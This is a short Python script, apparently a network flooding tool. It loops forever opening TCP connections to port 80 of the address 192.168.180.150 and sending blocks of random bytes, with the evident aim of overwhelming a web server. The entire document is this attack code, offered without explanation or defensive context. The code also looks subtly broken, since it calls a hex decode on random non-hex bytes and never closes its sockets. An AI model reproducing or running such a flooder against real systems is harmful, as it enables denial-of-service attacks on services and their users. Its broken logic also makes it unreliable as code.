import random
from socket import *

bytes = random._urandom(1490)

a = 0
while True :
	s = socket(AF_INET, SOCK_STREAM)
	s.connect(("192.168.180.150", 80))
	for i in range(10):
		s.send(bytes.decode('hex'))
		a = a+1
